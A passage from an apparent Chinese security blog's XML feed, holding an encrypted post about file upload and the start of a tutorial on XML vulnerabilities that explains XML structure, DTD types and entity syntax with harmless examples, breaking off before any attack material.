a986602a29366c33782f1c4201cac6200918c688b5b20fa5e6e6b2b7daa17c4e110c561945e4d3b2779a4a5aaba9e52376c9a937910ab12d52947bd8111eb8fa2cfc26931e0944151995481f07f2449bf5952919dfb18bf7a4eaa9cf253d19f9f4182a1c6b2d165554e4ab5aed19c8ffe1b1a0df4f1f8c03c88e03eafeb435c2d7f0126e8e71aa8c3c272df52573618c7b1bd76f81ffcac0d08a8869ed3a49620b576c8e122c9b01bf41880e25c602eca1cb244043ff21283b322f09fca3cdb86653abb50531b0a07a53eded085cd5e37290b5a3b3fdfa01c1d263d5491e9c447f25e862912c5da62ebbd2be5a23dbaab574f3acc92b0c0f120b4999715881df37fddd3c41cd4d212cc9046d6476b925db907e844bf9d06c9ecb2852447a142ca639e463d11aa77fda7a532b0bc9c72db43ab490181e4010062bd7c026cea49041d12a3324755d41405bd47f3396aaa3a71574e0b3b1f1c14a7ac54dbd784d4ff1cd1934173425b3e49cdf2882d8ddf2ab3a70dc0d4423030a36de0c57292924b22d97a29621afe23c763c6622af90d874e916c842e7720b114249c76ffffa5977f84cf7e2dc0dc6fec5bbe3bc1d8f880d14c49cae8ef6724d9724076bc957f12259e7365db31bd8b492cf3032e63fd86f35ebed0655896c0cf1359ca8cbeff2f3465c4a80369bdcf6f30ed8686d814966861c37eb46b30f8fcb2d70ac1953a334358c0e698fe5f197229a4858ef6bef4543d81b4adc730ab7e4932b4ab2c42b4e6aa7fe4222c3b927e88507629812ec10f016a5461a49df5bddfe702923aca1481ffaa4186b98a399fc47c7699ee7feeced05ec953887657141d7cb3f552d5b71e875192bea1db70af595624cc0baa2fde3ec43d62759d7a407405c24696f1dad798e9d7f3307aae4dce95cc1d90c2fe3b9936487db3d17fcdd91f81d06f6578cfcb169ca2b16271ace55b2eac243b824cb19b3dfccd191cc2e4098182a8d0257a299760add89704e1e7b7f6a154cf98c203c133bd6eace48bd3f80db820ebad47df94cfa1313790db8103ab9ec9103920fc43cff2ea9cbc22bb7f2955c2cc34663f764ad00006bf8be6ade98aafa81387555b60a37a13e25907ab76315c28bdc25f70ebcce3fb83c04b2df19ff60ca6c5694d80a9a7d95cfe2d5430c1fae0a374536a5c003f066f63baea7cfbef9879517e189740423b2133419cef8c8d7566ffda33f02fe11d821dc2b5f289f8ab445d7ae798bde36c6254edffb278320b4357ef64402179c2ca1ce4809a5be8c326e71635cadd5969edd20e75d61397b1ffb9e2b373db0f03aba9545d2904d74382e4ddf8bea4f67cb766f6a8ebacae1a5e2d523fd3ba1645778ce8d6be89908c5f5415970086275fc35886979aa0780693d73ccad8ec96ac1c3587d41463bcd817850e4cde87efd48f9bb26477baf347bca4fc58954ae298ad815e8ce895bb40d5b9b709dd980dc0555e925afb0937b08e2acbaebe2f63c8cca9839bf8699d0f82c5c4bbe4b4911fba870d91c3d7d78ebd27e55a3e7e865cf1edba480e7871afd085f3651da44e5ff2a11b42bfc5720e608a2d4942a9dec85254847d82895504469369b38c408865fcd9fa00816cd804c32360b3dfd6911c36dea94d781676d1f46f200801ea5d8fe1008b061be6f37206f47bc035ee485dd9a65618d34b75e4cbad36e654ae2ee2a11eab4b033b3c5759f93622b25806b36db43c798871947de65b79270967a5f10904c6832bae74aa416d26e3718bf1382837a4e95a9e0dfa0650948ed35ffdf9f560f41ae1528f5c3603863e879b1dc2e9593f7379eb3f1d1761053110dc9e14b16248acad74e7fc63eed59f1f53345f840d6af8fe81e62f32047b4296ec89da0fb126b70b5b33c365ca0478bfd224f24547a7bb0c00e9c3143a43d78bea6f432bf21c64681ef889e7961a59d04c8f07e40566f0dff7deea7477a59afca74a186589df968d6cac9740312b47af6339aeda8aadab1aad8b8289330fc38c57f8e85f9ef2950772cb36801d9b2cfba477ecb0f9d6aebbed665d34bba9e8423c6c0deedcb6a7abee4a9987fb8d209f01242a81750ceb01cdd5c98252c714cde17556bab0952d6db087a52b45ab0f326072b861460d9473dc8217dfbf5b4afe67cbe40c55a4c6b5b25d514e0aa46280050fcd4ec3a94164a3af87c984938cc5654690e481f47adeaead99c5940ecdc805306f552de981f9fb3a4094cfc444766e2623b2393a1629c347054f5b95a9affd6f5d00b8adedd4b74e2b576e4bb1a662ff63ff654cd5427d2696f572da60c761de729d2caaa76c300dfc0d4e5f5339678760c7f39c8bd2e4e10f7eda98d422e4a1609e9d9778d4b1942976f84f6f6a35b3b6a29eed9378ff423adbd145d7c1f3069c2f900078cab2d948c0c28a1910a4a25de6c5907512c64574da57046fda9fee79932638e3454e9a00b9f1723171eef543af3e6a8c6cd462fd84827192a95303d0ec2d2f76fc0d6de6ce9ae967809034efce8cb66d2283514be99567be186d157cb9a0e5594a7909531c250085555425ad731a07b03571c4d3ca7993b5ee3c23d2b8fe3c2274b297a2dc3d3f07d9a96affd0212ede1086a7ad1f6b1d57d7dcd03d3153d29ea0a8ee5a2c0f50ee24da71d60c4de29f64f3d6e2784dd3d430c6ad895c1e0c04f73169b032c4a186a26fde921036bf3cb8526b8573890074a43110247de032a888f87399a7f870f00e4d649e7d6be8b093c2f676b43cbed7ba2697551cb32fdd39bc0176f4117d1d794e893d4c858adad29ba8a7d107d0145d76fbda936dfbe9320f24df10f3577adc8bb3dfa66f214377ff3df83f346627d6d5729bb43b0165f02e72ca067c0da3d588709abd74ab02f65326855fcfbf8ba9ea8f3767cacf25f6b120cd9c089ffc4c358681ffa8f19abdd4967d7cf82b8b49da8485e0c43a6122b0947ecf473d0f3e5b4353e1d475d3d48b17395082d8b133a1855f408bde1c0f08f644d1ed58cb77deb6d776a2ebe50ed03784eecce28220be4666b36bf35b56e356385c49696f9660e76568c63a5a206c7c06b4e3e6dc23d15dcb20513778641df2c278a58949ea24b645fe1b60f36d809ebc6d25857a2ae390d3a97446ed808360d72cba4e76c51356af0b8dd82244380e521731af6d185ac1dcbe96b8cdef39860681356a3e2656e28b5ffe03dbd35253b949e3348bc29ab26f187e0e69d9f8370601acbf42e18f06739e232359b8d58b0efc9ed5e8bd3ec8df7c109067728a8b6325b8e0a7129a2544ec6289acd9149223a1ad5abdc10b1a1688c75450ea4414f05c98e79675cfda0569b1bf9694e9c0c15b846f9b18cbd519e5857bec8c8b33b1978332c1f0d3259dc9c1e8a9fbbff61d951199f04ae67f85d804d8ec042a2cd8fcc139529b28dfc170bf07e186311e08f6a51d79baffb6d9c375e80eac123e055fa2eb5c090a4b660aafe4c1d687c7fe4c5600ff317344873f7028ae84091cc84744ef927a3d20ecd3325535547b7656ee4b98cebf49a3d79fcf4958b00a47252ca47fd1a38758903c03c2d47614ed407779bf6983977f02505ca99d01e9e5177290446821cf2d3ab7ba982d22a1ddce6a4382c6a5ff4572ef45a3793dd0c2800b7915462101b404a973f2ccd7918149521c7b31bf3c988cdae4ecc698cc730b4a0d37edc46cc78a106b91ec95537b1657a24573daa3930ac5bb74bdf28106b403e860a6682c1e5768ed45c5c32c2f3d8298f12d36f30eb0164b666b63f6da1bc4b09f988a46b30a574d482310693a2a22d0390699a11f766c259e5ef91ad075c346cae32c70dac2c2f6e267fb603b5a1dc7fbb681f768a217a9137456d37ad854502362344be8e2ef7e1caeeb301799299df87680d3caa48e37d58adaf8b0d0c63e52aa43ea24fd3c376da2238af758e153cebeb9c633ec4d3ee1fab5f5556591d3eb7474ffd995dc2dbef4fe2c13f7a9d40319b27693fc6e4eef8060a3080265460f89c410d163e68a0f9ab9fbb92ebfac35405d037e8a4038b4915cef483be372dae76266190c1e63c0df7ef67481c8381eabd2eb37188708f731e16697e86cb7257167e1eaa395a030b7476ee43420377610a78aeca0a558519e82e498bc3622fbb6e60264ca98a287e820ef448687cad3df7a9e533717d4da90fafbdb591e37781deff9092a4c00956b2ea6cc450b1af0818b486079b04d4d800dcc4c4b81633465006114a5bfd66924725608a1f6963b534e77f91e26dc2bd1d7f395e1f3ee0a5ed93ca6eb02576d17e98267168f09ec5ae090a53bb06690403a2a9863acf34681ce875c558c43ccb13b1adce717d8092e011d348afe1e20e3eb3b9a149194899f1de7202c693b2f46c202ab30c38cdabb6f14581f89ea254be109684b5d59a3aab13331ab2bd667306ac049f14f2030ce214cf92ed3668a144e4df90c83902f68d966602222b71a824e0701c174fe24b194f066500a475ac8b0c7b1c9667293c2b3d9bfb9dabdcef188ab3274cf77281f5e0025366e67ce061f94cd62481c7006d796cc2097f37dfec2f5e2839bc1c04a86e7ad8b7bf797dda8e6912cbda8f85fd95450e0d53869c2f8af0d0d92c46d7b0eea517968ac75f983a9ed0e07967bee713d499bec01faf48b497510d9a560bf11e8b4a34443b295d6742c0606cd717cf58068c1e76dcbed654979bbf19a45fc0e775ac0800f668913d7e2d47dce6a9e390cbe37ad3fb9706534ac1d65edd8005ce47b754c26f434dc0158db8afff41c354269fb680d2edf453dd273879edafa6e0fc6de4c05a1eb8592b60a2883eafef759f87676549cf33766956710397ce1979948e556f4ccdb2c098b08b78a7d1073c8c1356d0d5b20c10d9a6d13644cb6c732a2f261d62a7e3bac102d7b25f2da38d03046b9a1071b1acf41604a2f44a1d6b434bd4339fdbae05bead909b311a9c31b9d225ef0155e779d6cad9758359ac547c9e0755663e9a7d74b134858d5ecbeabea1c48518b73dcea9765259995a42c962d87698103efea5963d9a9ce43486aa7496d37e9417c58fd71a5e61d167df3c3ca15d2ba79effbe699e5875c9a4f8f7d5c71eeb28cfe6142b441c6962208fbf6d00291584ffb437100d663483ed3e71bdcd92d7c537a816663e61f50f967c663f4ff3b28dc5a73d2d81f7f726684d3ff76fd478f71306c06e0752633df0468e5057d493577c0abe4f2221b6d58939f17582e17f2871981edc7b569582d3f90b07d795e205e9eb8b65abd0a0e69647abe5bdd62818a93160e3f15fd55fa969bde015d1b25df3e84c0172a0c14beea84aedee334df21355abfb95b98ec5a373008b870bf11397dbdbd70a8b50e68fcd99fdd5873ece8bab2f00dda3a6b737161f60dcd284d167f38b5acc89305cfc094a9dbe3321d4d964cda3e9c992ac016ae071258b0097bb3ae20db835304e84509e71cf832bf43edc35280496b7d20503c773b5abe24e899350bde3cf5e0dbd11019486580744c1fef3e88f12df08925a0ccf62e3931225345c9969da13607d31c6b5429932e6eba70fa9fcc52c3496c73bfa724c5075895afc3c2cdf5746cd5aee1e738ba91a1e4813a257d72fd733a2ca63014aaccd1df33972bbeca9b51462ba74a8603afccca098700845e89cb90eaf7f03b066e4e7f4553b871d8f3d071eccc4b4fa4b3bc7bcaafec7c952df48f993a21b01b4f9424084e6ac17cf4e8f64f0509d71aaef40272641b78a87b527226156e1a8fc303f37e367acd3211ba1260cc560401e142f222b59fcccb369039ddfead3000548d8a3bff6e2ea2297043c3438ddde809d731200c29c59bd608a18717933354249010cb5b5497457aefb10d6dc2a8d64f36f756f2998bd117a3c9c163d9a1d77724d42eb27dc63891c62c16ab7410b72a021e78d391158ac57efdd51fe21feda73e7bf060a0231f0db437ba55a235e8feee1a07716275fb044da31c70dada6caa701ae26959c0d7bf1b72f06b8b7596119ff44b540fcf466996989f0760cd1d67aa713a608c75a3825c4048cdb47b714eb8ef496eec139ede700d091be752dbfe4d03d02ed54be1279ec2d935d32ce6aa6ec5dc584294c8788c6784d666cb2f35e4eda1bbdfc325acc1b74275326c716d6adf222f30a51f2cbda5fa48225453bea9a73d0c45c7fddb6b56cb0c554558aec047ceccf4bc07da80e8d6e8548145b99f634a1697959c33d890f688635b4d96343b475feb6f176fd5f12a72b4dbe89541c0ef30edbe205863862456eb48c250b14ee2d8703bfc0e27937db36b38ed8e13ccd98310f225f7d823985c7542da15badc256e7c68d188d2df220452d137a8201d57822ded254bf4fc31130afc23d61d609049d5468fc661e79f377dca4d89cbdd78d9c1fe16e5e5b46178070158c98f07dd563591a6f06ec570f07197a9dfd91cb793234d30e69b6d9b2ba920ef360257ad5a5c1764026bc1b0fd50a4cc926ff96bafaa3cbc6ea62ac9785276e25f4711cfc108b07961a5d670f1ebd5d5b74ef2a881900991804ce47651e188c03e83a2d61fc1d4290af6089a793ccb95b55f4bb9f1a3f643fc334dbc3892f9c7c63ff689e120a52a1daac4154113a268c763dbb9da18739d314ef69e52bfd8b592cede0249b3c187f91cb91ec30af839a0794051820af4c8b47f76e33daf4c9235381ca28aab02cfa3cba250491054f601fdd74239331c98e857e7e6bc0802360aba0454a029ba265613be2464237ac5c9fb3106e2733965d9fc0667388ed192e45754d92cb64793bc034dade3a3edead8c335f780ec6b95350ab1d0436391daa32a6c0c5a59aa6744813dcfacda94d095ad43ca8cebc8026dfab402f40979f8c3c9aa1ea1c067ca3c2fc21de5b40a0530463d17faaebc1b7aceb3d049be94510c8dc4e0dc1a5ca2b0768e34724bfaafe9eeea15f551d205afbc53263eb1cdddf8f12af57d145f61a7682eadf1b6189f49c069434c833c608a9beb5eca5ab10adc0665261002aac06e374643a2c28f49f3c20249861255b582a894041fe14832b2b6c5acd134e88badb20bcb7a283fd57bb552d5afb3de019fe2cd332ff881266179a7e18a43bd0b6ef80b00cb3fe88adb95526b32913e4ccc821b6bb0f22c727c4ba096b43452d7a1c1fb3b230de4d64f1edc63b23e177485cd637b471c68469d0b1b1009c43fe50386159d9aa40fb25c827fe6342afc35e922a49dcabc356b8702496dff253f697c058b6531e30e7469ed1a478edd1428c3a5c00f3be6d1aefd11e37d946690dc6136285a9ee5862702c7afe50ed30d40898bfbb7dfbd5d582ad21e020725419c69fbc53685cf0907e516d6609d74181f446eca9b5a0fbc35f913a2d9808feff62878ca00ad594172658023008c3e49cf11ac4c0e120eed320495fe13413508e8c132769cc3de52d8a4d4dd43f1af1ba39201aa643efbc6411af0bf4b78af3f28287a590c70a1d4dc3f4d37619fc5d4ccf5c9f4ecb8b3bea4c2d2d6cd2fd72bcd62e4ecb910063006b26a7105130b77661f3d835de34d1e20e8a5c9663a8f4cd16e0f4c64d9a1c0c936c3f02749170ae3c7fe82dc5c97d6cd02cf8ad92f0aee2551de4173c090085b552b9aecf18a1c2982c6016b10df7d0dba9c4fb82fa2a5660d70d77a78579b4033f1569a6a7dfb2494d1b8549fe51c5a4783a259eb969fcc303c9ac2efb8805851b9882f896ce7488d3911211c6b82a72c60d59b6dacf3f8418b29c505409b59fb4fb9da716b22aae020734e26b2f144ba61b60b27c5bdba8f12e54cf3a9a7ef38d8ea8ad71b23497964167d1b72cde37def577b1093357d3fab80ef4f0a6613191f82e77d6c3759fab5555155b12d5267375c007f72f4aa9a6d86052aced95ca5c7d0f9e690a154b0a774f2faa92eea932f9168aea75604f7e3af4e8c4d737164d6618d235f8d2de465eb09aa687ed6a7472c44393ed1edf4cd226923f9ebc9f5bbfe6492ee0354897bfa85ef8be148d2e4b459f0148ad0319e6b74266cc1b9ba21f52b11e99e3e125528aea0a59969639f6f27967246578135183d09f74dd359a60923ed024c0b5b32a5cf1bdfbad49fc6d5886d9103bcf649b654ae8ff97e5bb7c7fc96600f251b05fce549987ab13ca2cb5ff48e27b7fce88dd28a66f3350e1553cf03bb1b014e0e3d1e05f05d874da6e262e7edf5ed5c25e19f3a948c2cedd8fb63a567339630882b5d93773663d8f71b975d3306111c63e639a25b002856c25f4e429bea170f2e73e901510ed3472d2dff2fa999de6b0b46ab41ff79304e61d9153898549da2b7a2b38a0869565f936a07c4d4c6143d175b8e29ebbab47b0e55e8968156fc0d4974f482024667d2ec5115fce54030fd9f06016c46df8421549bf6943efd49b0eabd4183bab170b646f9a3bb2bed334563e259dcaa833b9ea8f4eded753172b5ac171ef2e1c0b8d589de99c3c9eaf857916c5171078fed4971d6fb4ecfc41dfa5fa64f9a9e1af729275118a5d04b64037c05d735217580668701b736752d08a5eeb9573190e1bc6bc7fd9f10a2858e49c421e51187f4bc7d69208ad801840b35330c813bbad64328e846f8b377dee274794c7c8437b930e3ac868ee0fbf2614f5524d5a3a8b633f121b2332f434a7f5f6f62a441780aa6f73b3faf5f3c5414f2b1edb677d7c519e70b5e51c9edd06170cd6f4b39695795fc7714869d4a5ed06cfad87572cef6775e9d442683162e8fe07bdafee0162d438ee330fd58a060eb37dde268dfa77028df5c215b7e0c0143ead75e83b95d89d1cc7994d60c52b611829bd21bd56eea1ed34fa61ef4199ce470c1f0ffd9ed6c2fd219d24545c05482640e2a26eb9803ccfcbcbaea33710f488b01a8a8fc3179ac1e5b825f499a35836c4f2f9487fbf07e6933c380fff18438d91e87f497a38cf82c692d1a7c42c8b9df4640f19d7dca0def76cee2163247d29235fe3cc56baf88f9ce04084f52ce6fdf64803cb2970bf5eed420ee558320eeb09c2738a507cbe3bcabb6ee3074e41009ab5baa0a8413ff970c235023788c6d096f03040872daae285a73eb7bc9613a7ee30711661bd2d3f6cce20ad79ef4a7929fff14ede5126fb826e7e6bb7cacf8fa14027cf5f902e1902b76e1d61ef023720c0efe7f29edf6b8de56b735c6e8c169154749548ca5a6701449c6e1183303ca7979f507e0dbaef69ecc23f8616f3c45ee619638f4455b269028f870cbd80f994173f8cb1d5e3e7f01609a00b7b9e3bbe4a8d48686e3f6b16c9d1bb15644875958a6ae180fdba6ae7905c0039b801c60c3cbf3015d4b1cd37832d47026e820813ac91cfbc8bf265bcfc57b9fc76f242cb1074d45362ea41433f31aaf6dd76e2c5abd943d6f3e82ec035e918195890a48f6041e20881c9566566d6ebea4b63037076ae99bb3b3131ef0d6e443494953d0b22d17a366b562e01fee20a01956aa1aa1eb0eebe36ca4d32e91d51c12e9b4ff56288b14b0e923eec3d261ddc517665cb6ac194e57ed6eecc700496fac7c6520aab87660ad7ce843eda9f058bc320dba8a8a616978cbf7b4129bb860100ea77bf3483c90af38ae06c22e82d3675fe63c5b045681d7c1b47d7941e6ab7149b3700b28289b6d38a1e84ad4e9a142069d7545cd630f401ac24be17b723f6b0f2ab83a350bfc2b42a0f91cdbaa377a3b2f35672cab756ae6f8ff9cf6a9cd67109868e8274ddebb11fb90a1b4210bf40592d6a8ad8de4f0e99e869c443cbbf22457ed5f3b7631ae39870395127385da47759a22111fda7d6b1e5d54c411c2a6af2c6ff329c6801dd2da75468c22aacd77c4be0ecbf65c69dcb65a96d3dcfbe275cd81db54733c56666761b2a08a01dd2aa93c8845cc1e3027f18aec338c587a1f8996494a723c485cb8c6b170d8bb801236af716bf201c234b35c43fd6204df9d520a179d356f5e3b4cb740464991b76f8d63b30cf794113e0ab42175592417624c9d00c336aa157f3abfa2f17dfaf9cbedd9daaa2b63b647802df5d8cfa69b7fbe8a0dea7066abff64405e60f595a6cc559a1a47a549cc933c51ed20d5b38bed5f2a903a377c781aef7bd9ff8be8e1e17e75be55e79c2156970601722fb9cad21b30ffb1c027ddf47ce1ef1b22b2f795ae4ffaa1b8496fc00513a160914705f96b7b1c61525861054805dbd8821b852303f9f8978c9609d7feed46ffe972de8affd53125a2b163384003454e35fb790fd92f68064955542e997e0e22237b5a48d71fc188273a05ee05ab1bc7614a8eeaad479079056fd953b9c19f7894eb43fef22f6ae922e3a63c52eaf58ddb2afec968c11bfa78fa767d53395432b653951a44b48c55f0e51601d8c6bedf5e6916d992d5e053694a944ded56ff5ac8d8aba825e9dff9578940aca21c3956c5d2b6c01787846b42cc051b5100904dc7d429749ad7edbd6c43a6b1b9bbbe07952f3d4635f9fac7d45f9f9c13395eaea5870244b79bb13d7a7fcd4dddf1a73a5f2320c3dbe92fb4af938d74f899e033256e17307d696216d722cc66b9aeba7e3a986b9c4cc1bb9c8df0861677adcbc11f6fb6e262c6b772bee38e04e9870547aa8365e6e1fdc4ee2c36979b40cedb350fcfdde2d35e682413fd5e01f35323a03d4582a28c73be8a962ffc841d25c8d82f910f46d5d7e3cf56a853c4952c8698d4a95cae0e708242d2e4e2f2ed763faa2f5516928e7a7dcef4f67208dfcc5a458ae5f63dac0e052b2c8d203387ad896344e3bb627f681998aa6114adbcf90fe2399d233f9d20a1037f8fc9c65cbfc2d3a34f9f036c7c9710e9620a1502c1b8ca08fcf2c6092939a58c711377b2c000545823fd1a676694623b2c33816205ab69ea021d288c9205898d0054489128e3df3c4dea601523d71be2b971d042d9e2781977d74103ac68e18b7d60d6504bdd5e6491ccace6576e43d34c5fbeee6fc4f665874deee3b6f3e813754b0e77e7f6b0103f543204b5d736cc688cf46ea2035e84f2f2a1877cb1297ddfb9aae0d9acef814eca2e803e4f306cfd502a9d78d663c5fcc46b6c457beeb5195177c8f909f4b72675c43a14ebaa0bbbda3fb3fc6f0378b3c82fcca45f1b8df818f610b12525c143936c7f79cc6956292dadf8c7832320d370780792f462f3a0c2e685e5364058601c3c6671502d3b3eff195719c5203eceec5530d8d1a6f9251aee9780bb474b8caaa2eda105a33891543b9ed2e466ca7abdb1fa92e8f7412b1c28433c08f4169b2e709b12e13d05d045ea22081e1a978229c0f65482a44ef1a8506b5745421328e289b0cba3f8e98714f2ab7b13ba3349e60343a9b8220df04fa9de59a2add1b5a730db4f0e0cc85c04954e041db7d7f2daea67824467f8299ca7b2d7fe5e9d4b019d3eeb865f82724dc71ed7c7ab9c4ce11fbc04d03a5b67c80c679b5fbb02dab71fe55206f6bbd945f150a37edb22ed0e8396a2f65230665a4cd1e421d80ec7193f35738d10111d48ff60e926229d5e601560a7f2ef8367eb28c40b24f3f68a003ecd96a904be1bdf4a9e220fa407454e45a3492d24c699b8834274c4dfa3c76d6e66292e5cf2bbcb35e0a1130d3bbf9d87733ad7ae864ba9c0cbf58eeda75da6dfe5ae1c8023a03483d6055a2e221f9ec82ff55c5ffb1ca9441608ae8fa0554e67a2263df7ae5d3fb28f1e548865e50c657d4ef6155924594c60bc5d4d3854e6a5f258f2e54bd10e36a3a3c3268ee011be3d60b338f7f8a651e565d60d1d90bc4043ca69dce82f8dec73a3e540156f67dc22650471242910401f9d2f97ffe52dce873683c575dd2b75208239a1eab5f22a0359264d6fe679f542668ae64c7e326d801b37a1b105682b3455de3d93fc47954f901ba18a6091a3a3ef50746649063762135d4d754cabf51379f171a9a005cc4a61c4b6042b8b79ebc0d7b280676c8f03eb96b5e7b0e63dfc9a2fccd2b99367076d1d7175f5f85b3aef36ed5441f6f7e9501735b2ef616216aca41f3e9ab550353da6b723c9b1e9bfbd70ee868839ef57b05544d1551fe4df2469052f9756c749ffab6c190cffbef094d2131bb4126a7ff0d833d280c8a4e27f8a52a6d4cf28bd68f3a481c13ed67cb89cd87545fb2770eede1b0d607bd1002b90fc35a429ac90398d2e5806b479592cbcedc50027931757eeaa8b6c2b3605258e65da643dbfb8a6dc6cbae0ae87be70d8140211a2eb43d0e4f35c3621ddcb3ab80a2968012b2de727d8f1f7ab6a142a1f9afbef73007a99cb01b1b051bfcef9071852a0699742257f8752d9e2e5747de32ae4193735edcf69c9a37da6bb602c9eff3227a0c7b4e920f2ce4e1a6430bc4a4a00ad40f4e3a904129dd8ed00c82e9b3f147fe1154140ba15aad6ac39d10989ff9584da085cb71ef42fdcf8bf838a22b782bf04148ce95bf726f0ca348ab8179e08c10cc620847770277e2b4ba04bba3587aeaa1b36feefe75642037954663265e66c48b44d6a368a9037860811e99394529bc30814c9aaa963ee3a03fb177329da857d3b53317948ebfeff5923f0b35f6dd90cf3cd9676aeeb286d44b1ba9d1d7c33535a4e959b3a647e21e9a006ff0bc610768d805f704de962e1e446e315177d831d82f0b82d95e5b105305dc0e927c316bc20b8c731d010c5ee0b7d9b3a4805f6dd6f93106e289034651077c8e3edee2710c853044760489b2a437f4a77e72e7a3ee3a4a1b59268db359210dd6e199e3a17b242c9e20db0df800ec4e7ff840433dd58dc1b6e88f3d9becddb024a80b77bf50161ce835d40bfa0cde57030b65d65f9c08dd878740fc34533f6473fc7a27ad056c58cf8ca1bf824d8502063fc0290436c141fe80235172d189822d7c39d53163016295e4f1af01630358de1355a796e6446b86a72058669a9525dfebd589466a74e5d511cd10192df9376beb6c6fa88e7665dc4d5e237fa2c4de94f59cde41864c38d2b32100e0fef26527dbd74211c7ca15ef2949376070712e5a8040c3e8b35f1e7b8f2107a67a6803b6b159876acae00c8d544d351eff872d008dc49191b1a1dede510b0ce4271379bbc0792593d3d37b91fc0d37d426018260f748fd08c95118cf86bbf1845980538b82d0eefb1a31470af31bf1cfadc94a759155299db2467b94bad74a2b9bb51a1ea8d5f19ba713bc107332bb2f2262155191733514141a1c320f1c645dbb2eb1a64ac3742a30369bb4e1ac3ab26288129a8888eba6eb0b273af33aa40cf65b21413d81d7d699dc8feaa43308f2f2bae3b266cced6f0e7d787fc6fc236e158af55a189e531d4e5d6e9e65f0dda23821e937bf5c0154597e86ee56d96a2fe93ddc60e1a9cbf3f821a327dcb73550daf844933d53282201f157bbc590d08eed0346530ea2a5f42cce3b4a81ee08b40c7bd1948a0c711835240823694a773aab5f0dedaba22803ebdd2aa43b48a4732a92d21ff9cbbe5a6a5403b1af1d083f0d48a297065df7956b35b4367c006b64cabced76f742daf3072fb724</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文参考了他人的文章但找不到出处，故加密。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML漏洞</title>
    <link href="/2023/01/01/XML%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XML%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="xml漏洞">XML漏洞</h1><h2 id="xml格式">XML格式</h2><blockquote><p>XML被设计用来传输和存储数据，其焦点是数据的内容。</p></blockquote><p>首先了解XML(可扩展标记语言) 基本格式（内部DTD）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;                              &lt;!--xml文件的声明--&gt;<br>&lt;!DOCTYPE note [                                   &lt;!--定义此文档是 note 类型的文档--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;             &lt;!--定义note元素有四个元素--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;                            &lt;!--定义to元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;                          &lt;!--定义from元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;                          &lt;!--定义head元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;                          &lt;!--定义body元素为”#PCDATA”类型--&gt;<br>]&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><p>总的来说</p><p>第一部分：XML声明</p><p>第二部分：文档类型定义DTD //漏洞一般在此出现</p><p>第三部分：文档元素</p><h2 id="dtd">DTD</h2><blockquote><p>DTD：用来约束XML文档定义语义约束分类</p></blockquote><h3 id="内部dtd">内部DTD</h3><h3 id="外部dtd">外部DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;<br><br>example:<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br><br></code></pre></td></tr></table></figure><h3 id="公共dtd">公共DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="dtd实体">DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>按实体有无参分类</p><h3 id="一般实体"><strong>一般实体</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>&amp;实体名称;<br></code></pre></td></tr></table></figure><h3 id="参数实体">参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>%实体名称;<br></code></pre></td></tr></table></figure><p>按实体使用方式分类</p><pre><code class="hljs">1. 内部实体</code></pre><figure class="highlight plaintext"><table><tr><td 